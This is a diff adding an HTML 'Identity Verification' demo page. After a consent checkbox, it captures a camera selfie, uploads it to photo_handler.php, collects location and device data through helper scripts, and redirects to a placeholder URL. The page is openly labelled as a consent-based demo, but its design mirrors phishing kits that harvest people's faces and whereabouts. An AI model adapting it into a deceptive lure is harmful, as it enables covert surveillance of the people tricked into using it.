@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identity Verification</title>
+  <link rel="icon" type="image/x-icon" href="https://www.freefavicon.com/freefavicons/icons/flat-location-logo-152-234349.png">
+  <script type="text/javascript">
+    if (window.location.protocol == "http:" && !/^(localhost|127\.|0\.0\.0\.0|192\.168\.|10\.)/.test(window.location.hostname)) {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+    }
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="/js/location.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: radial-gradient(circle at top, #1b2735 0%, #090a0f 100%);
+      color: #e8eaed; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      padding: 24px;
+    }
+    .card {
+      width: 100%; max-width: 460px; background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.09); border-radius: 18px;
+      padding: 28px; backdrop-filter: blur(8px); box-shadow: 0 24px 60px rgba(0,0,0,0.45);
+    }
+    .badge {
+      display: inline-block; font-size: 12px; letter-spacing: .06em; text-transform: uppercase;
+      color: #8ab4f8; border: 1px solid rgba(138,180,248,0.35); border-radius: 999px;
+      padding: 4px 12px; margin-bottom: 14px;
+    }
+    h1 { font-size: 22px; margin: 0 0 10px; font-weight: 600; }
+    p { line-height: 1.55; font-size: 14px; color: #bdc1c6; }
+    .ar { direction: rtl; text-align: right; font-size: 13px; color: #9aa0a6; }
+    ul.notice { margin: 10px 0 16px; padding: 0; list-style: none; font-size: 13.5px; color: #bdc1c6; }
+    ul.notice li { padding: 5px 0 5px 24px; position: relative; }
+    ul.notice li::before { content: "✔"; position: absolute; left: 2px; color: #81c995; }
+    label.agree {
+      display: flex; gap: 10px; align-items: flex-start; font-size: 13.5px; line-height: 1.45;
+      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.09);
+      border-radius: 12px; padding: 12px 14px; margin: 6px 0 18px; cursor: pointer; color: #e8eaed;
+    }
+    label.agree input { margin-top: 2px; accent-color: #8ab4f8; }
+    button {
+      width: 100%; padding: 13px; border: 0; border-radius: 12px; font-size: 15px; font-weight: 600;
+      color: #0b0e12; background: #8ab4f8; cursor: pointer; transition: opacity .15s, transform .05s;
+    }
+    button:hover:not(:disabled) { opacity: .92; }
+    button:active:not(:disabled) { transform: scale(0.99); }
+    button:disabled { opacity: .4; cursor: not-allowed; }
+    button.ghost { background: transparent; color: #e8eaed; border: 1px solid rgba(255,255,255,0.18); margin-top: 10px; }
+    .videoWrap { position: relative; margin: 6px 0 14px; border-radius: 14px; overflow: hidden; background: #000; aspect-ratio: 4 / 3; }
+    video { width: 100%; height: 100%; object-fit: cover; display: block; transform: scaleX(-1); }
+    #live {
+      position: absolute; top: 10px; left: 10px; font-size: 11px; font-weight: 700; letter-spacing: .08em;
+      background: rgba(217,48,37,0.9); color: #fff; padding: 3px 9px; border-radius: 999px;
+    }
+    #previewWrap img { width: 100%; border-radius: 14px; display: block; margin: 6px 0 14px; }
+    #status { font-size: 13px; color: #8ab4f8; min-height: 18px; margin: 14px 0 0; }
+    .hint { font-size: 12px; color: #80868b; margin-top: 6px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <span class="badge">Consent-based demo</span>
+    <h1>Identity Verification</h1>
+    <p>This page asks for your permission before doing anything. Nothing is captured until you tick the box and press the buttons below.</p>
+    <ul class="notice">
+      <li>A selfie photo from your camera</li>
+      <li>Your current location (browser prompt)</li>
+      <li>Basic device information</li>
+    </ul>
+    <p class="ar">عرض توضيحي بموافقة صريحة: لن يتم أخذ أي صورة أو موقع قبل موافقتك، والمتصفح سيظهر لك طلب الإذن بنفسه.</p>
+
+    <label class="agree">
+      <input type="checkbox" id="agree">
+      <span>I have read the notice above and agree to share a selfie, my location and basic device information for this demo.</span>
+    </label>
+
+    <button id="enable" disabled>Enable camera</button>
+    <button id="skip" class="ghost" hidden>Continue without photo</button>
+
+    <div id="stage" hidden>
+      <div class="videoWrap">
+        <video id="cam" autoplay playsinline muted></video>
+        <span id="live">LIVE</span>
+      </div>
+      <button id="shoot">Capture photo</button>
+    </div>
+
+    <div id="previewWrap" hidden>
+      <img id="preview" alt="Captured selfie preview">
+      <button id="send">Send photo &amp; continue</button>
+      <button id="retake" class="ghost">Retake</button>
+    </div>
+
+    <p id="status"></p>
+    <p class="hint">The camera stays on only while previewing and is switched off right after capture.</p>
+    <canvas id="snap" hidden></canvas>
+  </div>
+
+  <script>
+    var REDIRECT = 'REDIRECT_URL';
+    var stream = null;
+    var shot = null;
+
+    function setStatus(text) {
+      document.getElementById('status').textContent = text;
+    }
+
+    function stopCam() {
+      if (stream) {
+        stream.getTracks().forEach(function (track) { track.stop(); });
+        stream = null;
+      }
+      document.getElementById('live').hidden = true;
+    }
+
+    function startCam() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        setStatus('This browser does not support camera access.');
+        return;
+      }
+      setStatus('Waiting for camera permission...');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(function (s) {
+          stream = s;
+          document.getElementById('cam').srcObject = s;
+          document.getElementById('stage').hidden = false;
+          document.getElementById('previewWrap').hidden = true;
+          document.getElementById('enable').disabled = true;
+          document.getElementById('skip').hidden = true;
+          document.getElementById('live').hidden = false;
+          setStatus('Camera is on. Press "Capture photo".');
+        })
+        .catch(function (err) {
+          document.getElementById('skip').hidden = false;
+          setStatus('Camera unavailable (' + err.name + '). You can continue without a photo.');
+        });
+    }
+
+    document.getElementById('agree').addEventListener('change', function () {
+      var agreed = this.checked;
+      document.getElementById('enable').disabled = !agreed;
+      if (agreed) {
+        information();
+        setStatus('Consent recorded. Press "Enable camera" to start.');
+      } else {
+        setStatus('');
+      }
+    });
+
+    document.getElementById('enable').addEventListener('click', startCam);
+
+    document.getElementById('retake').addEventListener('click', function () {
+      shot = null;
+      document.getElementById('previewWrap').hidden = true;
+      startCam();
+    });
+
+    document.getElementById('skip').addEventListener('click', function () {
+      stopCam();
+      document.getElementById('stage').hidden = true;
+      document.getElementById('skip').hidden = true;
+      setStatus('Continuing without a photo. Requesting location permission...');
+      locate(
+        function () { finish(false); },
+        function () { finish(true); }
+      );
+    });
+
+    document.getElementById('shoot').addEventListener('click', function () {
+      var video = document.getElementById('cam');
+      if (!video.videoWidth) {
+        setStatus('Camera is still starting, try again in a second.');
+        return;
+      }
+
+      var canvas = document.getElementById('snap');
+      var w = 640, h = 480;
+      var vw = video.videoWidth, vh = video.videoHeight;
+      var targetRatio = w / h;
+      var sw = vw, sh = vh;
+      if (vw / vh > targetRatio) {
+        sw = vh * targetRatio;
+      } else {
+        sh = vw / targetRatio;
+      }
+      var sx = (vw - sw) / 2, sy = (vh - sh) / 2;
+
+      canvas.width = w;
+      canvas.height = h;
+      canvas.getContext('2d').drawImage(video, sx, sy, sw, sh, 0, 0, w, h);
+
+      shot = canvas.toDataURL('image/jpeg', 0.85);
+      document.getElementById('preview').src = shot;
+      document.getElementById('previewWrap').hidden = false;
+      document.getElementById('stage').hidden = true;
+      document.getElementById('send').disabled = false;
+      stopCam();
+      setStatus('Preview looks good? Press "Send photo & continue".');
+    });
+
+    document.getElementById('send').addEventListener('click', function () {
+      if (!shot) return;
+      var sendBtn = document.getElementById('send');
+      sendBtn.disabled = true;
+      setStatus('Uploading photo...');
+
+      $.post('photo_handler.php', { Status: 'success', Photo: shot })
+        .done(function (response) {
+          var result = response;
+          try { result = JSON.parse(response); } catch (e) { }
+          if (!result || result.status !== 'success') {
+            setStatus('Upload rejected by the server.');
+            sendBtn.disabled = false;
+            return;
+          }
+          setStatus('Photo received. Now requesting location permission...');
+          locate(
+            function () { finish(false); },
+            function () { finish(true); }
+          );
+        })
+        .fail(function () {
+          setStatus('Upload failed. Check your connection and try again.');
+          sendBtn.disabled = false;
+        });
+    });
+
+    function finish(skippedLocation) {
+      stopCam();
+      if (!skippedLocation && REDIRECT && REDIRECT !== 'REDIRECT_URL') {
+        setStatus('Done. Redirecting...');
+        setTimeout(function () { window.location = REDIRECT; }, 900);
+      } else if (skippedLocation) {
+        setStatus('Photo saved. Location was not shared.');
+      } else {
+        setStatus('Done. Thank you!');
+      }
+    }
+  </script>
+</body>
+</html>
